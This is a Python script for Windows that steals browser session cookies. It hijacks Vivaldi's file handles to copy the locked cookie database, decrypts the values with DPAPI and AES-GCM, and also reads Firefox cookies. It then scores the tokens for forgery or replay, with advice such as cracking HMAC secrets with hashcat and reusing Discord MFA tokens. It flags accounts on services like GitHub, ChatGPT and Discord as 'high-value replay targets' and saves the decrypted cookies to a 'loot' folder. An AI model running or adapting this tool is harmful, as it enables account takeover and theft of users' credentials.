#!/usr/bin/env python3
"""
session_break.py - Best-effort session cookie extraction + cryptanalysis.

1. Extract Vivaldi cookie DB via handle hijacking (NtQuerySystemInformation)
   - Duplicates the browser's file handle with DUPLICATE_SAME_ACCESS
   - Reads the SQLite DB without closing the browser
2. Decrypt cookie values with DPAPI + AES-256-GCM (proper Python implementation)
3. Extract session cookies (expirationDate == 0)
4. Full cryptanalysis:
   - Token type classification (JWT, opaque, base64, hex, signed)
   - Shannon entropy + effective bit strength
   - JWT header/payload decoding + algorithm vulnerability assessment
   - Cross-token correlation (shared secrets, CSRF-session pairing)
   - Forgery feasibility per token
   - Replay attack priority ranking
"""

import json
import base64
import math
import re
import os
import sys
import sqlite3
import struct
import ctypes
import ctypes.wintypes
import hashlib
from collections import Counter, defaultdict
from datetime import datetime, timezone
from pathlib import Path

# ---------------------------------------------------------------------------
# Win32 API bindings for handle hijacking (Windows-only; the analysis modes
# below work on Linux, the live extraction does not)
# ---------------------------------------------------------------------------

if sys.platform == "win32":
    ntdll = ctypes.WinDLL("ntdll.dll")
    kernel32 = ctypes.WinDLL("kernel32.dll")
    crypt32 = ctypes.WinDLL("crypt32.dll")

# Set argtypes for functions that need 64-bit handle support
kernel32.OpenProcess.argtypes = [ctypes.wintypes.DWORD, ctypes.wintypes.BOOL, ctypes.wintypes.DWORD]
kernel32.OpenProcess.restype = ctypes.wintypes.HANDLE
kernel32.DuplicateHandle.argtypes = [
    ctypes.wintypes.HANDLE, ctypes.wintypes.HANDLE, ctypes.wintypes.HANDLE,
    ctypes.POINTER(ctypes.wintypes.HANDLE), ctypes.wintypes.DWORD,
    ctypes.wintypes.BOOL, ctypes.wintypes.DWORD
]
kernel32.DuplicateHandle.restype = ctypes.wintypes.BOOL
kernel32.GetFileType.argtypes = [ctypes.wintypes.HANDLE]
kernel32.GetFileType.restype = ctypes.wintypes.DWORD
kernel32.SetFilePointerEx.argtypes = [ctypes.wintypes.HANDLE, ctypes.c_longlong, ctypes.POINTER(ctypes.c_longlong), ctypes.wintypes.DWORD]
kernel32.SetFilePointerEx.restype = ctypes.wintypes.BOOL
kernel32.ReadFile.argtypes = [ctypes.wintypes.HANDLE, ctypes.c_void_p, ctypes.wintypes.DWORD, ctypes.POINTER(ctypes.wintypes.DWORD), ctypes.c_void_p]
kernel32.ReadFile.restype = ctypes.wintypes.BOOL
kernel32.GetFileSizeEx.argtypes = [ctypes.wintypes.HANDLE, ctypes.POINTER(ctypes.c_longlong)]
kernel32.GetFileSizeEx.restype = ctypes.wintypes.BOOL

# NtQuerySystemInformation
NtQuerySystemInformation = ntdll.NtQuerySystemInformation
NtQuerySystemInformation.argtypes = [
    ctypes.wintypes.ULONG,    # SystemInformationClass
    ctypes.c_void_p,          # SystemInformation
    ctypes.wintypes.ULONG,    # SystemInformationLength
    ctypes.POINTER(ctypes.wintypes.ULONG)  # ReturnLength
]
NtQuerySystemInformation.restype = ctypes.c_long

# Constants
SystemExtendedHandleInformation = 0x40
STATUS_INFO_LENGTH_MISMATCH = -1073741820  # 0xC0000004 as signed 32-bit
PROCESS_DUP_HANDLE = 0x0040
DUPLICATE_SAME_ACCESS = 0x0002
FILE_TYPE_DISK = 0x0001

class SYSTEM_HANDLE_INFORMATION_EX(ctypes.Structure):
    _fields_ = [
        ("Object", ctypes.c_void_p),
        ("UniqueProcessId", ctypes.POINTER(ctypes.c_ulong)),  # actually ULONG_PTR
        ("HandleValue", ctypes.POINTER(ctypes.c_ulong)),      # actually ULONG_PTR
        ("GrantedAccess", ctypes.c_ulong),
        ("CreatorBackTraceIndex", ctypes.c_ushort),
        ("ObjectTypeIndex", ctypes.c_ushort),
        ("HandleAttributes", ctypes.c_ulong),
        ("Reserved", ctypes.c_ulong),
    ]

# We'll parse the raw buffer manually since the struct layout is tricky on x64

def find_pids(exe_name):
    """Find PIDs by exe name using CreateToolhelp32Snapshot."""
    TH32CS_SNAPPROCESS = 0x00000002

    class PROCESSENTRY32W(ctypes.Structure):
        _fields_ = [
            ("dwSize", ctypes.wintypes.DWORD),
            ("cntUsage", ctypes.wintypes.DWORD),
            ("th32ProcessID", ctypes.wintypes.DWORD),
            ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
            ("th32ModuleID", ctypes.wintypes.DWORD),
            ("cntThreads", ctypes.wintypes.DWORD),
            ("th32ParentProcessID", ctypes.wintypes.DWORD),
            ("pcPriClassBase", ctypes.c_long),
            ("dwFlags", ctypes.wintypes.DWORD),
            ("szExeFile", ctypes.c_wchar * 260),
        ]

    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    pe = PROCESSENTRY32W()
    pe.dwSize = ctypes.sizeof(PROCESSENTRY32W)
    pids = []
    if kernel32.Process32FirstW(snap, ctypes.byref(pe)):
        while True:
            if pe.szExeFile.lower() == exe_name.lower():
                pids.append(pe.th32ProcessID)
            if not kernel32.Process32NextW(snap, ctypes.byref(pe)):
                break
    kernel32.CloseHandle(snap)
    return pids

def hijack_cookie_db(browser_exe, dst_path, table_name="cookies"):
    """
    Extract a browser's locked SQLite DB by duplicating its file handle.
    Returns True on success, writes DB to dst_path.
    """
    pids = find_pids(browser_exe)
    if not pids:
        print(f"  [!] No {browser_exe} processes found")
        return False
    print(f"  [*] Found {len(pids)} {browser_exe} processes: {pids[:5]}{'...' if len(pids)>5 else ''}")

    pid_set = set(pids)

    # Query all system handles (0x40 = SystemExtendedHandleInformation)
    # System has ~12MB of handle data, need to retry with growing buffer
    buf_size = 0x400000  # 4MB initial
    buf = None
    status = STATUS_INFO_LENGTH_MISMATCH
    for attempt in range(5):
        buf = (ctypes.c_char * buf_size)()
        ret_len = ctypes.wintypes.ULONG(0)
        status = NtQuerySystemInformation(SystemExtendedHandleInformation, buf, buf_size, ctypes.byref(ret_len))
        if status == 0:
            break
        if status == STATUS_INFO_LENGTH_MISMATCH:
            needed = ret_len.value if ret_len.value > buf_size else buf_size * 2
            buf_size = needed + 0x10000
            print(f"  [*] Retry {attempt+1}: buffer {buf_size//1024}KB (needed {ret_len.value//1024}KB)")
        else:
            break

    if status != 0:
        print(f"  [!] NtQuerySystemInformation failed: 0x{status & 0xFFFFFFFF:08X} (attempt {attempt+1})")
        return False

    # Parse: 16-byte header (NumberOfHandles:8 + Reserved:8), then 40-byte entries
    raw = bytes(buf[:ret_len.value])
    num_handles = struct.unpack_from("<Q", raw, 0)[0]
    print(f"  [*] Total system handles: {num_handles}")

    entry_size = 40  # x64: Object(8) + PID(8) + Handle(8) + Access(4) + BackTrace(2) + Type(2) + Attr(4) + Reserved(4)
    offset = 16  # skip header

    scanned = 0
    browser_handles = 0
    sqlite_found = 0
    disk_found = 0
    for i in range(num_handles):
        if offset + entry_size > len(raw):
            break
        obj, pid, handle_val, granted_access, back_trace, obj_type, attrs, reserved = \
            struct.unpack_from("<QQQIHHII", raw, offset)
        offset += entry_size

        if pid not in pid_set:
            continue
        browser_handles += 1

        # Open the browser process for handle duplication
        h_proc = kernel32.OpenProcess(PROCESS_DUP_HANDLE, False, pid)
        if not h_proc:
            continue

        # Duplicate the handle
        dup_handle = ctypes.wintypes.HANDLE()
        if not kernel32.DuplicateHandle(h_proc, ctypes.wintypes.HANDLE(handle_val),
                                         kernel32.GetCurrentProcess(),
                                         ctypes.byref(dup_handle),
                                         0,  # DUPLICATE_SAME_ACCESS
                                         False, DUPLICATE_SAME_ACCESS):
            kernel32.CloseHandle(h_proc)
            continue

        kernel32.CloseHandle(h_proc)

        # Check if it's a disk file
        ftype = kernel32.GetFileType(dup_handle)
        if ftype != FILE_TYPE_DISK:
            kernel32.CloseHandle(dup_handle)
            continue
        disk_found += 1

        # Read first 16 bytes to check for SQLite magic
        try:
            read_buf = (ctypes.c_char * 16)()
            bytes_read = ctypes.wintypes.DWORD(0)
            new_pos = ctypes.c_longlong(0)
            kernel32.SetFilePointerEx(dup_handle, 0, ctypes.byref(new_pos), 0)  # FILE_BEGIN
            if not kernel32.ReadFile(dup_handle, read_buf, 16, ctypes.byref(bytes_read), None):
                kernel32.CloseHandle(dup_handle)
                continue
            if bytes_read.value < 16:
                kernel32.CloseHandle(dup_handle)
                continue
            first16 = read_buf.raw[:16]
            if first16 != b"SQLite format 3\x00":
                kernel32.CloseHandle(dup_handle)
                continue
            sqlite_found += 1

            # Get file size
            fsize = ctypes.c_longlong(0)
            kernel32.GetFileSizeEx(dup_handle, ctypes.byref(fsize))
            fsize = fsize.value
            if fsize < 50000 or fsize > 50_000_000:
                kernel32.CloseHandle(dup_handle)
                continue

            print(f"  [+] Found SQLite DB handle (PID={pid}, handle=0x{handle_val:X}, size={fsize} bytes)")

            # Read entire file
            kernel32.SetFilePointerEx(dup_handle, 0, None, 0)
            db_data = bytearray()
            chunk = (ctypes.c_char * 65536)()
            remaining = fsize
            while remaining > 0:
                to_read = min(65536, remaining)
                bytes_read = ctypes.wintypes.DWORD(0)
                if not kernel32.ReadFile(dup_handle, chunk, to_read, ctypes.byref(bytes_read), None):
                    break
                if bytes_read.value == 0:
                    break
                db_data.extend(chunk.raw[:bytes_read.value])
                remaining -= bytes_read.value

            kernel32.CloseHandle(dup_handle)

            if len(db_data) < 50000:
                continue

            # Write to temp file
            with open(dst_path, "wb") as f:
                f.write(bytes(db_data))

            # Verify table exists
            try:
                conn = sqlite3.connect(dst_path)
                cur = conn.cursor()
                cur.execute(f"SELECT count(*) FROM {table_name}")
                count = cur.fetchone()[0]
                conn.close()
                print(f"  [+] Table '{table_name}' verified: {count} rows")
                return True
            except Exception as e:
                print(f"  [!] Table verification failed: {e}")
                continue
        except Exception:
            try:
                kernel32.CloseHandle(dup_handle)
            except:
                pass
            continue

        kernel32.CloseHandle(dup_handle)

    print(f"  [!] No matching DB handle found (scanned {browser_handles} browser handles, {disk_found} disk, {sqlite_found} sqlite)")
    return False

# ---------------------------------------------------------------------------
# Chromium cookie decryption (DPAPI + AES-256-GCM)
# ---------------------------------------------------------------------------

def dpapi_decrypt(data):
    """Decrypt data using Windows DPAPI (CryptUnprotectData)."""
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.wintypes.DWORD),
                     ("pbData", ctypes.POINTER(ctypes.c_char))]

    in_blob = DATA_BLOB(len(data), ctypes.cast(ctypes.c_char_p(data), ctypes.POINTER(ctypes.c_char)))
    out_blob = DATA_BLOB()
    desc = ctypes.c_wchar_p()

    if not crypt32.CryptUnprotectData(ctypes.byref(in_blob), ctypes.byref(desc), None, None, None, 0, ctypes.byref(out_blob)):
        return None

    result = ctypes.string_at(out_blob.pbData, out_blob.cbData)
    kernel32.LocalFree(out_blob.pbData)
    return result

def aes_gcm_decrypt(key, nonce, ciphertext, tag):
    """AES-256-GCM decryption using Python's cryptography library."""
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        aesgcm = AESGCM(key)
        return aesgcm.decrypt(nonce, ciphertext + tag, None)
    except ImportError:
        # Fallback: use pycryptodome
        try:
            from Crypto.Cipher import AES
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag)
        except ImportError:
            print("[!] Need: pip install cryptography")
            sys.exit(1)

def get_chromium_key(local_state_path):
    """Extract the AES-256-GCM key from Chromium's Local State file."""
    with open(local_state_path, "r", encoding="utf-8") as f:
        data = json.load(f)

    encrypted_key_b64 = data["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)

    # Strip "DPAPI" prefix (5 bytes)
    if encrypted_key[:5] == b"DPAPI":
        encrypted_key = encrypted_key[5:]

    key = dpapi_decrypt(encrypted_key)
    if key and len(key) == 32:
        return key
    return None

def decrypt_chromium_value(encrypted_value, key, host_key=None):
    """Decrypt a single Chromium cookie value.

    Vivaldi/Chrome >=118 uses v10 prefix but prepends a 32-byte SHA256(host_key)
    domain hash to the plaintext (cookie isolation). We detect and strip it.
    """
    if not encrypted_value:
        return ""

    # v10/v11 prefix
    if encrypted_value[:3] in (b"v10", b"v11"):
        nonce = encrypted_value[3:15]    # 12 bytes
        tag = encrypted_value[-16:]      # last 16 bytes
        ciphertext = encrypted_value[15:-16]
        try:
            plaintext = aes_gcm_decrypt(key, nonce, ciphertext, tag)
        except Exception as e:
            return f"[DECRYPT_FAILED: {e}]"

        # Check for 32-byte SHA256(host_key) domain hash prefix (Chrome >=118)
        if host_key and len(plaintext) >= 32:
            expected_hash = hashlib.sha256(host_key.encode("utf-8")).digest()
            if plaintext[:32] == expected_hash:
                plaintext = plaintext[32:]

        return plaintext.decode("utf-8", errors="replace")

    # v20 prefix (Chrome >=127 app-bound)
    if encrypted_value[:3] == b"v20":
        return "[V20_ENCRYPTED: needs app-bound key extraction]"

    # Plaintext (no encryption)
    try:
        return encrypted_value.decode("utf-8", errors="replace")
    except:
        return ""

# ---------------------------------------------------------------------------
# Extract cookies from Vivaldi
# ---------------------------------------------------------------------------

def extract_vivaldi_cookies():
    """Extract and decrypt Vivaldi session cookies using handle hijacking."""
    print("=" * 100)
    print("STAGE 1: Handle hijacking - extract Vivaldi cookie DB")
    print("=" * 100)

    vivaldi_user_data = os.path.join(os.environ["LOCALAPPDATA"], "Vivaldi", "User Data")
    local_state = os.path.join(vivaldi_user_data, "Local State")
    cookie_db = os.path.join(vivaldi_user_data, "Default", "Network", "Cookies")

    print(f"  [*] Local State: {local_state}")
    print(f"  [*] Cookie DB: {cookie_db}")

    # Get AES key
    print("\n  [*] Extracting AES-256-GCM key from Local State...")
    key = get_chromium_key(local_state)
    if key:
        print(f"  [+] Key extracted: {key.hex()[:16]}... ({len(key)} bytes)")
    else:
        print("  [!] Failed to extract key")
        return []

    # Extract DB via handle hijacking
    tmp_db = os.path.join(os.environ["TEMP"], "vivaldi_cookies_hijack.db")
    print(f"\n  [*] Hijacking cookie DB handle...")
    if not hijack_cookie_db("vivaldi.exe", tmp_db, "cookies"):
        print("  [!] Handle hijacking failed")
        return []

    # Read cookies
    print(f"\n  [*] Reading cookies from hijacked DB...")
    conn = sqlite3.connect(tmp_db)
    cur = conn.cursor()
    cur.execute("""
        SELECT host_key, name, path, encrypted_value, expires_utc,
               is_secure, is_httponly, samesite, has_expires
        FROM cookies
        ORDER BY host_key, name
    """)

    cookies = []
    decrypted_ok = 0
    decrypt_fail = 0
    session_count = 0

    for row in cur.fetchall():
        host, name, path, enc_val, expires_utc, secure, httponly, samesite, has_expires = row

        # Convert expires_utc (Chrome epoch: microseconds since 1601-01-01)
        if expires_utc == 0:
            unix_exp = 0
        else:
            unix_exp = expires_utc // 1000000 - 11644473600

        value = decrypt_chromium_value(enc_val, key, host) if enc_val else ""

        if "[DECRYPT_FAILED" in value:
            decrypt_fail += 1
        elif value:
            decrypted_ok += 1

        is_session = (unix_exp == 0)

        cookie = {
            "domain": host,
            "name": name,
            "value": value,
            "path": path,
            "expirationDate": unix_exp,
            "secure": bool(secure),
            "httpOnly": bool(httponly),
            "sameSite": "None" if samesite == 2 else ("Strict" if samesite == 1 else "Lax"),
            "hostOnly": not host.startswith("."),
            "session": is_session,
        }
        cookies.append(cookie)
        if is_session:
            session_count += 1

    conn.close()

    print(f"  [+] Total cookies: {len(cookies)}")
    print(f"  [+] Decrypted OK: {decrypted_ok}")
    print(f"  [+] Decrypt failed: {decrypt_fail}")
    print(f"  [+] Session cookies: {session_count}")

    # Clean up
    try:
        os.unlink(tmp_db)
    except:
        pass

    return cookies

def extract_firefox_cookies():
    """Extract Firefox session cookies (plaintext, no encryption needed)."""
    print("\n" + "=" * 100)
    print("STAGE 1b: Extract Firefox cookies (plaintext)")
    print("=" * 100)

    if sys.platform == "win32":
        ff_profile = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
    else:
        ff_profile = os.path.expanduser("~/.mozilla/firefox")
    if not os.path.isdir(ff_profile):
        print("  [!] No Firefox profiles found")
        return []

    cookies = []
    for prof in os.listdir(ff_profile):
        prof_lower = prof.lower()
        if not (".default" in prof_lower or ".esr" in prof_lower or ".dev" in prof_lower):
            continue
        db_path = os.path.join(ff_profile, prof, "cookies.sqlite")
        if not os.path.exists(db_path):
            continue
        print(f"  [*] Reading: {db_path}")
        # Copy to temp to avoid lock
        tmp = os.path.join(os.environ["TEMP"], "ff_cookies_tmp.db")
        try:
            import shutil
            shutil.copy2(db_path, tmp)
        except:
            continue
        conn = sqlite3.connect(tmp)
        cur = conn.cursor()
        cur.execute("""
            SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite
            FROM moz_cookies
            ORDER BY host, name
        """)
        for row in cur.fetchall():
            host, name, value, path, expiry, secure, httponly, samesite = row
            is_session = (expiry == 0)
            cookies.append({
                "domain": host,
                "name": name,
                "value": value,
                "path": path,
                "expirationDate": expiry,
                "secure": bool(secure),
                "httpOnly": bool(httponly),
                "sameSite": "None" if samesite == 0 else ("Lax" if samesite == 1 else "Strict"),
                "hostOnly": not host.startswith("."),
                "session": is_session,
            })
        conn.close()
        try:
            os.unlink(tmp)
        except:
            pass

    session_count = sum(1 for c in cookies if c["session"])
    print(f"  [+] Total cookies: {len(cookies)}")
    print(f"  [+] Session cookies: {session_count}")
    return cookies

# ---------------------------------------------------------------------------
# Cryptanalysis
# ---------------------------------------------------------------------------

def shannon_entropy(data: bytes) -> float:
    if not data:
        return 0.0
    freq = Counter(data)
    total = len(data)
    ent = 0.0
    for count in freq.values():
        p = count / total
        ent -= p * math.log2(p)
    return ent

def b64url_decode(s):
    padded = s + "=" * (4 - len(s) % 4) if len(s) % 4 else s
    return base64.urlsafe_b64decode(padded)

def classify_and_analyze(value):
    """Classify token type and analyze structure."""
    info = {
        "type": "opaque",
        "raw_len": len(value),
        "entropy_bpb": round(shannon_entropy(value.encode()), 3),
        "bit_strength": int(shannon_entropy(value.encode()) * len(value)),
        "encoding": "plaintext",
        "decoded": None,
        "notes": [],
        "jwt": None,
        "forgery": "",
    }

    if not value:
        info["type"] = "empty"
        info["forgery"] = "EMPTY: no value"
        return info

    # JWT: three base64url segments
    parts = value.split(".")
    if len(parts) == 3 and all(re.match(r'^[A-Za-z0-9_-]+$', p) for p in parts) and len(parts[0]) > 8:
        info["type"] = "JWT"
        info["encoding"] = "base64url"
        info["jwt"] = analyze_jwt(value)
        info["forgery"] = assess_jwt_forgery(info["jwt"])
        return info

    # Express signed cookie: s:payload.signature
    if value.startswith("s:"):
        info["type"] = "express_signed"
        info["encoding"] = "signed_cookie"
        inner = value[2:].split(".")
        info["notes"].append(f"express_signed, inner_parts={len(inner)}")
        info["forgery"] = "FEASIBLE: if Express session secret is weak (hashcat/john), forge arbitrary session data"
        return info

    # Two-part token (id.signature or token.hmac)
    if len(parts) == 2 and len(parts[0]) > 10 and len(parts[1]) > 4:
        info["type"] = "two_part"
        info["encoding"] = "signed_token"
        info["notes"].append(f"part1_len={len(parts[0])} part2_len={len(parts[1])}")
        info["forgery"] = "FEASIBLE: if signature is HMAC with weak secret, forge new payload"
        return info

    # Hex string
    if re.match(r'^[0-9a-fA-F]+$', value) and len(value) >= 16 and len(value) % 2 == 0:
        info["type"] = "hex"
        info["encoding"] = "hex"
        dec = bytes.fromhex(value)
        info["decoded"] = dec[:32].hex()
        info["notes"].append(f"hex_bytes={len(dec)}")
        info["forgery"] = assess_entropy_forgery(info["bit_strength"])
        return info

    # Base64
    if re.match(r'^[A-Za-z0-9+/]+=*$', value) and len(value) >= 16:
        try:
            dec = base64.b64decode(value + "==")
            if len(dec) > 4:
                info["type"] = "base64"
                info["encoding"] = "base64"
                info["decoded"] = dec[:32].hex()
                printable = sum(1 for b in dec if 32 <= b < 127)
                if printable / len(dec) > 0.8:
                    info["notes"].append(f"decoded_text={dec[:80].decode('utf-8', errors='replace')}")
                info["forgery"] = assess_entropy_forgery(info["bit_strength"])
                return info
        except:
            pass

    # Base64url
    if re.match(r'^[A-Za-z0-9_-]+$', value) and len(value) >= 16:
        try:
            dec = b64url_decode(value)
            if len(dec) > 4:
                info["type"] = "base64url"
                info["encoding"] = "base64url"
                info["decoded"] = dec[:32].hex()
                info["forgery"] = assess_entropy_forgery(info["bit_strength"])
                return info
        except:
            pass

    # Numeric
    if re.match(r'^\d+$', value):
        info["type"] = "numeric"
        info["encoding"] = "decimal"
        info["forgery"] = "TRIVIAL: numeric ID - enumerate or predict next"
        return info

    # Prefixed tokens
    if value.startswith("mfa."):
        info["type"] = "discord_mfa"
        info["forgery"] = "REPLAY: Discord MFA token - use directly for account access"
        return info

    # URL-encoded
    if "%" in value and re.search(r'%[0-9A-Fa-f]{2}', value):
        try:
            decoded = re.sub(r'%([0-9A-Fa-f]{2})', lambda m: chr(int(m.group(1), 16)), value)
            info["notes"].append(f"url_decoded={decoded[:60]}")
            # Check if decoded is JSON
            if decoded.startswith("{"):
                info["type"] = "url_encoded_json"
                info["encoding"] = "url_encoded"
                try:
                    j = json.loads(decoded)
                    info["decoded"] = j
                    info["notes"].append(f"json_keys={list(j.keys())[:5]}")
                    info["forgery"] = "FEASIBLE: URL-encoded JSON - modify fields and re-encode"
                except:
                    info["forgery"] = assess_entropy_forgery(info["bit_strength"])
                return info
        except:
            pass

    # URL
    if value.startswith("http"):
        info["type"] = "url"
        info["forgery"] = "INFO: URL value (callback URL, not a session token)"
        return info

    # Default: opaque random token
    info["forgery"] = assess_entropy_forgery(info["bit_strength"])
    return info

def analyze_jwt(token):
    parts = token.split(".")
    result = {}
    try:
        header = json.loads(b64url_decode(parts[0]))
        result["header"] = header
        result["alg"] = header.get("alg", "?")
        result["kid"] = header.get("kid")
    except:
        result["header_error"] = True
    try:
        payload = json.loads(b64url_decode(parts[1]))
        result["payload"] = payload
        for claim in ["exp", "iat", "nbf", "iss", "aud", "sub", "email", "role", "user_id", "session_id"]:
            if claim in payload:
                v = payload[claim]
                if claim in ("exp", "iat", "nbf") and isinstance(v, (int, float)):
                    result[claim] = datetime.fromtimestamp(v, tz=timezone.utc).isoformat()
                else:
                    result[claim] = v
    except:
        result["payload_error"] = True
    try:
        sig = b64url_decode(parts[2])
        result["sig_len"] = len(sig)
        result["sig_entropy"] = round(shannon_entropy(sig), 3)
    except:
        result["sig_len"] = 0
    return result

def assess_jwt_forgery(jwt_info):
    if not jwt_info:
        return "JWT: analysis failed"
    alg = jwt_info.get("alg", "?")
    if alg == "none":
        return "TRIVIAL: alg=none - forge unsigned JWT with arbitrary claims"
    if alg in ("HS256", "HS384", "HS512"):
        return f"FEASIBLE: {alg} HMAC - crack secret (hashcat -m 16500), then forge any claims"
    if alg in ("RS256", "RS384", "RS512"):
        return f"HARD: {alg} RSA - need private key, or alg-confusion (HS256 with public key)"
    if alg in ("ES256", "ES384"):
        return f"HARD: {alg} ECDSA - need private key"
    return f"UNKNOWN: alg={alg}"

def assess_entropy_forgery(bits):
    if bits < 32:
        return f"WEAK: {bits} bits - trivially brute-forceable"
    if bits < 64:
        return f"WEAK: {bits} bits - brute-forceable with effort"
    if bits < 128:
        return f"MODERATE: {bits} bits - expensive to brute-force, replay preferred"
    return f"STRONG: {bits} bits - not brute-forceable, replay only"

# ---------------------------------------------------------------------------
# Main cryptanalysis
# ---------------------------------------------------------------------------

def run_cryptanalysis(cookies):
    print("\n" + "=" * 100)
    print("STAGE 2: Cryptanalysis of session cookies")
    print("=" * 100)

    session_cookies = [c for c in cookies if c.get("session") or c.get("expirationDate", 1) == 0]
    print(f"  Total cookies: {len(cookies)}")
    print(f"  Session cookies (expirationDate==0): {len(session_cookies)}")

    if not session_cookies:
        print("  [!] No session cookies found")
        return

    # Analyze each
    results = []
    for c in session_cookies:
        a = classify_and_analyze(c.get("value", ""))
        results.append((c, a))

    # Summary table
    print(f"\n  {'#':>3}  {'Domain':<32} {'Cookie':<36} {'Type':<16} {'Bits':>5}  {'Ent':>5}  Forgery assessment")
    print(f"  {'-'*3}  {'-'*32} {'-'*36} {'-'*16} {'-'*5}  {'-'*5}  {'-'*55}")
    for i, (c, a) in enumerate(results):
        print(f"  {i+1:>3}  {c['domain'][:32]:<32} {c['name'][:36]:<36} {a['type'][:16]:<16} {a['bit_strength']:>5}  {a['entropy_bpb']:>5.2f}  {a['forgery'][:55]}")

    # JWT deep dive
    jwts = [(c, a) for c, a in results if a.get("jwt")]
    if jwts:
        print(f"\n{'='*100}")
        print(f"JWT ANALYSIS ({len(jwts)} tokens)")
        print(f"{'='*100}")
        for c, a in jwts:
            j = a["jwt"]
            print(f"\n  Domain: {c['domain']}  Cookie: {c['name']}")
            print(f"  Algorithm: {j.get('alg','?')}")
            if j.get("kid"):
                print(f"  Key ID: {j['kid']}")
            payload = j.get("payload", {})
            if payload:
                print(f"  Claims:")
                for k, v in payload.items():
                    vs = str(v)
                    if len(vs) > 80: vs = vs[:80] + "..."
                    print(f"    {k}: {vs}")
            for claim in ["exp", "iat", "nbf"]:
                if j.get(claim):
                    print(f"  {claim}: {j[claim]}")
            print(f"  Signature: {j.get('sig_len',0)} bytes, entropy={j.get('sig_entropy',0):.2f}")
            print(f"  Forgery: {a['forgery']}")

    # URL-encoded JSON tokens
    json_tokens = [(c, a) for c, a in results if a.get("type") == "url_encoded_json"]
    if json_tokens:
        print(f"\n{'='*100}")
        print(f"URL-ENCODED JSON TOKENS ({len(json_tokens)})")
        print(f"{'='*100}")
        for c, a in json_tokens:
            print(f"\n  Domain: {c['domain']}  Cookie: {c['name']}")
            if a.get("decoded"):
                print(f"  JSON content:")
                for k, v in a["decoded"].items():
                    vs = str(v)
                    if len(vs) > 80: vs = vs[:80] + "..."
                    print(f"    {k}: {vs}")
            print(f"  Forgery: {a['forgery']}")

    # Cross-token correlation
    print(f"\n{'='*100}")
    print("CROSS-TOKEN CORRELATION")
    print(f"{'='*100}")
    by_domain = defaultdict(list)
    for c in session_cookies:
        by_domain[c["domain"]].append(c)
    found = False
    for domain, dom_cookies in by_domain.items():
        if len(dom_cookies) < 2:
            continue
        for i, a in enumerate(dom_cookies):
            for b in dom_cookies[i+1:]:
                va, vb = a.get("value",""), b.get("value","")
                if va and vb:
                    if va == vb:
                        print(f"  DUPLICATE: {domain} | {a['name']} == {b['name']}")
                        found = True
                    elif va in vb:
                        print(f"  SUBSTRING: {domain} | {b['name']} contains {a['name']}")
                        found = True
                    elif vb in va:
                        print(f"  SUBSTRING: {domain} | {a['name']} contains {b['name']}")
                        found = True
    if not found:
        print("  No direct correlations found.")

    # Entropy distribution
    print(f"\n{'='*100}")
    print("ENTROPY DISTRIBUTION")
    print(f"{'='*100}")
    buckets = {"0-32 (trivial)": 0, "33-64 (weak)": 0, "65-128 (moderate)": 0, "129+ (strong)": 0}
    for _, a in results:
        b = a["bit_strength"]
        if b <= 32: buckets["0-32 (trivial)"] += 1
        elif b <= 64: buckets["33-64 (weak)"] += 1
        elif b <= 128: buckets["65-128 (moderate)"] += 1
        else: buckets["129+ (strong)"] += 1
    for label, count in buckets.items():
        print(f"  {label:25s}  {count:>3}  {'#' * count}")

    # Token type distribution
    print(f"\n{'='*100}")
    print("TOKEN TYPE DISTRIBUTION")
    print(f"{'='*100}")
    type_counts = Counter(a["type"] for _, a in results)
    for t, cnt in type_counts.most_common():
        print(f"  {t:25s}  {cnt:>3}")

    # High-value replay targets
    print(f"\n{'='*100}")
    print("HIGH-VALUE REPLAY TARGETS")
    print(f"{'='*100}")
    high_value = ["chatgpt", "claude", "github", "x.com", "twitter",
                  "discord", "steam", "instagram", "youtube", "google",
                  "deepl", "soundcloud", "itch.io", "riotgames", "zoom"]
    for c, a in results:
        if any(hv in c["domain"].lower() for hv in high_value):
            print(f"  {c['domain']:<32} {c['name']:<36} bits={a['bit_strength']:>5}  {a['forgery'][:50]}")

    # Save decrypted session cookies
    out_path = "loot/session_decrypted.json"
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump([c for c, _ in results], f, indent=2, ensure_ascii=False)
    print(f"\n  [+] Decrypted session cookies saved to: {out_path}")

    # Save full cryptanalysis report
    report_path = "loot/cryptanalysis_report.json"
    report = []
    for c, a in results:
        entry = {
            "domain": c["domain"],
            "name": c["name"],
            "value_preview": c.get("value","")[:60],
            "value_len": len(c.get("value","")),
            "type": a["type"],
            "encoding": a["encoding"],
            "bit_strength": a["bit_strength"],
            "entropy_bpb": a["entropy_bpb"],
            "forgery_assessment": a["forgery"],
            "notes": a.get("notes", []),
        }
        if a.get("jwt"):
            entry["jwt"] = a["jwt"]
        if a.get("decoded"):
            entry["decoded"] = a["decoded"] if isinstance(a["decoded"], str) else str(a["decoded"])
        report.append(entry)
    with open(report_path, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2, ensure_ascii=False)
    print(f"  [+] Full cryptanalysis report saved to: {report_path}")

if __name__ == "__main__":
    # Extract cookies
    if sys.platform != "win32":
        print("[-] live Vivaldi extraction needs Windows (handle hijacking via NtQuerySystemInformation)")
        print("    on Linux only the Firefox cookie read below works (profile at ~/.mozilla/firefox)")
    vivaldi_cookies = extract_vivaldi_cookies() if sys.platform == "win32" else []
    firefox_cookies = extract_firefox_cookies()

    all_cookies = vivaldi_cookies + firefox_cookies
    print(f"\n{'='*100}")
    print(f"TOTAL: {len(all_cookies)} cookies ({len(vivaldi_cookies)} Vivaldi + {len(firefox_cookies)} Firefox)")
    print(f"{'='*100}")

    # Run cryptanalysis
    run_cryptanalysis(all_cookies)
